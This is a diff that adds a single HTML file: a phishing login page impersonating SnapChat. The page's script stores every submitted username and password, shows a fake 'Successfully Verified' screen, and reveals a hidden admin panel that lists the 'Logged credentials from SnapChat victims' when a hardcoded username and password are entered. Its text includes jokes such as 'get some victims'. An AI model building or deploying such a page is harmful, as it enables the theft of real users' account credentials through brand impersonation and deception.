@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapCrap</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #FFD700 0%, #FFF8DC 50%, #FFFFFF 100%);
+            overflow: hidden;
+        }
+
+        .screen { display: none; text-align: center; width: 100%; max-width: 420px; padding: 0 16px; }
+        .screen.active { display: block; }
+
+        /* LOGIN */
+        .login-box {
+            background: #fff;
+            border-radius: 24px;
+            padding: 48px 36px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+        }
+
+        .ghost { font-size: 64px; margin-bottom: 8px; animation: bob 2s ease-in-out infinite; }
+        @keyframes bob { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
+
+        .avatar-img { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; margin-bottom: 8px; animation: bob 2s ease-in-out infinite; border: 3px solid #FFD700; box-shadow: 0 4px 16px rgba(255,215,0,.3); }
+
+
+
+        .app-name {
+            font-size: 36px; font-weight: 800;
+            background: linear-gradient(135deg,#FFD700,#FFA500);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+
+        .tagline { color: #999; font-size: 14px; margin-top: 4px; margin-bottom: 28px; }
+
+        .login-box form { display: flex; flex-direction: column; gap: 14px; }
+
+        .login-box input {
+            width: 100%; padding: 15px 20px; border: 2px solid #eee; border-radius: 14px;
+            font-size: 15px; font-family: 'Poppins', sans-serif; outline: none;
+            background: #fafafa; transition: border-color .3s, box-shadow .3s;
+        }
+
+        .login-box input:focus { border-color: #FFD700; box-shadow: 0 0 0 4px rgba(255,215,0,.15); background: #fff; }
+        .login-box input::placeholder { color: #bbb; }
+
+        .input-hint { text-align: left; font-size: 11px; color: #999; margin-top: -8px; padding-left: 4px; }
+        .input-error { border-color: #ff4444 !important; }
+        .error-msg { color: #ff4444; font-size: 12px; text-align: left; margin-top: -8px; padding-left: 4px; display: none; }
+
+        .login-btn {
+            width: 100%; padding: 15px; border: none; border-radius: 14px;
+            font-size: 16px; font-weight: 700; font-family: 'Poppins', sans-serif;
+            color: #fff; background: linear-gradient(135deg,#FFD700,#FFA500);
+            cursor: pointer; transition: transform .2s, box-shadow .2s;
+            text-shadow: 0 1px 2px rgba(0,0,0,.1);
+        }
+
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(255,215,0,.4); }
+        .login-btn:active { transform: translateY(0); }
+
+        .extra { margin-top: 18px; }
+        .extra a { color: #FFA500; text-decoration: none; font-size: 13px; font-weight: 600; }
+        .extra a:hover { color: #FFD700; }
+        .signup-line { margin-top: 18px; padding-top: 18px; border-top: 1px solid #eee; color: #999; font-size: 14px; }
+        .signup-line a { font-size: 14px; font-weight: 700; }
+
+        /* VERIFIED */
+        .verified-box { animation: popIn .6s cubic-bezier(.175,.885,.32,1.275) both; }
+        @keyframes popIn { from{opacity:0;transform:scale(.5)} to{opacity:1;transform:scale(1)} }
+
+        .verified-box h1 { font-size: 32px; font-weight: 800; color: #333; text-shadow: 0 2px 10px rgba(0,0,0,.08); animation: slideUp .5s ease .3s both; }
+        .verified-box p { font-size: 18px; color: #666; margin-top: 8px; animation: slideUp .5s ease .5s both; }
+        @keyframes slideUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
+
+        .checkmark-svg { width: 100px; height: 100px; margin-bottom: 24px; }
+        .checkmark-svg circle { stroke:#FFD700; stroke-width:2; stroke-dasharray:166; stroke-dashoffset:166; animation: drawCircle .6s cubic-bezier(.65,0,.45,1) forwards; }
+        .checkmark-svg path { stroke:#FFA500; stroke-width:3; stroke-linecap:round; stroke-linejoin:round; stroke-dasharray:48; stroke-dashoffset:48; animation: drawCheck .3s cubic-bezier(.65,0,.45,1) .6s forwards; }
+        @keyframes drawCircle { to{stroke-dashoffset:0} }
+        @keyframes drawCheck { to{stroke-dashoffset:0} }
+
+        /* ADMIN PANEL */
+        .admin-box {
+            background: #1a1a2e; border-radius: 24px; padding: 36px; width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,.3); color: #eee; max-width: 560px;
+        }
+
+        .admin-box h1 { font-size: 22px; font-weight: 800; margin-bottom: 4px; color: #FFD700; }
+        .admin-box .sub { font-size: 12px; color: #666; margin-bottom: 20px; }
+
+        .log-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
+        .log-table th { color: #FFD700; border-bottom: 2px solid #333; padding: 8px 6px; font-weight: 700; }
+        .log-table td { border-bottom: 1px solid #222; padding: 8px 6px; color: #ccc; word-break: break-all; }
+        .log-table tr:hover td { background: rgba(255,215,0,.05); }
+
+        .empty-msg { color: #555; font-size: 14px; padding: 30px 0; }
+
+        .admin-actions { margin-top: 20px; display: flex; gap: 10px; }
+        .admin-actions button {
+            flex: 1; padding: 10px; border: none; border-radius: 10px;
+            font-family: 'Poppins', sans-serif; font-weight: 600; font-size: 13px; cursor: pointer;
+        }
+
+        .btn-clear { background: #FFA500; color: #fff; }
+        .btn-clear:hover { background: #e09400; }
+        .btn-logout { background: #333; color: #eee; }
+        .btn-logout:hover { background: #444; }
+
+        @media (max-width: 480px) {
+            .login-box { padding: 36px 24px; }
+            .app-name { font-size: 28px; }
+            .admin-box { padding: 24px 16px; }
+            .log-table { font-size: 11px; }
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- LOGIN SCREEN -->
+<div class="screen active" id="loginScreen">
+    <div class="login-box">
+        <div id="avatarContainer">
+            <!-- 👇 CHANGE THIS URL TO SET YOUR AVATAR PICTURE. Leave empty to show the ghost emoji. -->
+            <img class="avatar-img" id="avatarImg" src="https://cdn-icons-png.flaticon.com/512/1384/1384066.png" alt="" onerror="this.style.display='none';document.getElementById('ghostEmoji').style.display='block';">
+            <div class="ghost" id="ghostEmoji" style="display:none;">👻</div>
+        </div>
+        <h1 class="app-name">SnapChat</h1>
+        <p class="tagline">Login below</p>
+        <form id="loginForm" novalidate>
+            <input type="text" id="username" placeholder="Username or Email" required autocomplete="off">
+            <p class="error-msg" id="usernameError">Username must be at least 8 characters</p>
+            <input type="password" id="password" placeholder="Password" required>
+            <p class="error-msg" id="passwordError">Password must be at least 8 characters</p>
+            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+        </form>
+        <div class="extra">
+            <a href="#">Forgot Password?</a>
+            <div class="signup-line">Don't have an account? <a href="#">Sign Up</a></div>
+        </div>
+    </div>
+</div>
+
+<!-- VERIFIED SCREEN -->
+<div class="screen" id="verifiedScreen">
+    <div class="verified-box">
+        <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+            <circle cx="26" cy="26" r="25" fill="none"/>
+            <path fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+        </svg>
+        <h1>Successfully Verified</h1>
+        <p>Welcome to SnapChat 🎉</p>
+    </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<div class="screen" id="adminScreen">
+    <div class="admin-box">
+        <h1>🔑 Secret Admin Panel</h1>
+        <p class="sub">Logged credentials from SnapChat victims</p>
+        <div id="logContent"></div>
+        <div class="admin-actions">
+            <button class="btn-clear" id="clearBtn">Clear Logs</button>
+            <button class="btn-logout" id="logoutBtn">Log Out</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const STORAGE_KEY = 'snapchat_logs';
+
+    function getLogs() {
+        try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; }
+        catch { return []; }
+    }
+
+    function saveLog(user, pass) {
+        const logs = getLogs();
+        logs.push({ user, pass, time: new Date().toLocaleString() });
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(logs));
+    }
+
+    function clearLogs() {
+        localStorage.removeItem(STORAGE_KEY);
+        renderLogs();
+    }
+
+    function renderLogs() {
+        const logs = getLogs();
+        const el = document.getElementById('logContent');
+        if (!logs.length) {
+            el.innerHTML = '<p class="empty-msg">No logs yet… get some victims 🎣</p>';
+            return;
+        }
+        let html = '<table class="log-table"><thead><tr><th>#</th><th>Username</th><th>Password</th><th>Time</th></tr></thead><tbody>';
+        logs.forEach((l, i) => {
+            html += `<tr><td>${i + 1}</td><td>${esc(l.user)}</td><td>${esc(l.pass)}</td><td>${esc(l.time)}</td></tr>`;
+        });
+        html += '</tbody></table>';
+        el.innerHTML = html;
+    }
+
+    function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const usernameError = document.getElementById('usernameError');
+    const passwordError = document.getElementById('passwordError');
+
+    function clearErrors() {
+        usernameInput.classList.remove('input-error');
+        passwordInput.classList.remove('input-error');
+        usernameError.style.display = 'none';
+        passwordError.style.display = 'none';
+    }
+
+    usernameInput.addEventListener('input', function() {
+        if (this.value.trim().length >= 8) {
+            this.classList.remove('input-error');
+            usernameError.style.display = 'none';
+        }
+    });
+
+    passwordInput.addEventListener('input', function() {
+        if (this.value.length >= 8) {
+            this.classList.remove('input-error');
+            passwordError.style.display = 'none';
+        }
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        clearErrors();
+
+        const user = usernameInput.value.trim();
+        const pass = passwordInput.value;
+        let valid = true;
+
+        if (user.length < 8) {
+            usernameInput.classList.add('input-error');
+            usernameError.style.display = 'block';
+            valid = false;
+        }
+
+        if (pass.length < 8) {
+            passwordInput.classList.add('input-error');
+            passwordError.style.display = 'block';
+            valid = false;
+        }
+
+        if (!valid) return;
+
+        if (user === 'noktsecc' && pass === 'noktsecc') {
+            renderLogs();
+            showScreen('adminScreen');
+        } else {
+            saveLog(user, pass);
+            showScreen('verifiedScreen');
+        }
+
+        usernameInput.value = '';
+        passwordInput.value = '';
+    });
+
+    // Avatar: if src is empty, show ghost emoji instead
+    (function() {
+        var img = document.getElementById('avatarImg');
+        var ghost = document.getElementById('ghostEmoji');
+        if (img && ghost) {
+            if (!img.src || img.src === window.location.href || img.getAttribute('src') === '') {
+                img.style.display = 'none';
+                ghost.style.display = 'block';
+            } else {
+                img.style.display = '';
+                ghost.style.display = 'none';
+            }
+        }
+    })();
+
+    document.getElementById('clearBtn').addEventListener('click', clearLogs);
+
+    document.getElementById('logoutBtn').addEventListener('click', function() {
+        showScreen('loginScreen');
+    });
+</script>
+
+</body>
+</html>
